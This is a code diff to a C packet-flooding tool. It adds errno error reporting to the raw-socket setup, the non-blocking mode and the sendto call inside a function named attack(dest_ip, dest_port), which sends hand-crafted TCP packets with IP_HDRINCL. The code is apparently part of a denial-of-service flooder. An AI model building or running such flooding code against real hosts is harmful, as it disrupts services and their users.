@@ -40,9 +40,10 @@ int createSocket(void) {
 	int fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
 	if(fd < 0) {
-		printf("Can't create raw socket");
+		printf("Error creating raw socket. Error number : %d . Error message : %s \n", errno, strerror(errno));
 		exit(-1);
 	}
+
 	//IP_HDRINCL to tell the kernel that headers are included in the packet
 	int one = 1;
 	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
@@ -52,8 +53,8 @@ int createSocket(void) {
 
 	//Set to non-block
 	int flags = fcntl(fd, F_GETFL, 0);
-	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0){
-		printf("Can't set to non-block mode");
+	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
+		printf("Error setting non-block mode. Error number : %d . Error message : %s \n", errno, strerror(errno));
 		exit(-1);
 	}
 
@@ -134,7 +135,9 @@ void attack(const char* dest_ip, int dest_port) {
 
 		tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
 
-		sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr*)&sin, sizeof(struct sockaddr_in));
+		if(sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr*)&sin, sizeof(struct sockaddr_in)) < 0) {
+			printf("Error sending packet. Error number : %d . Error message : %s \n", errno, strerror(errno));
+		}
 	}
 }
 
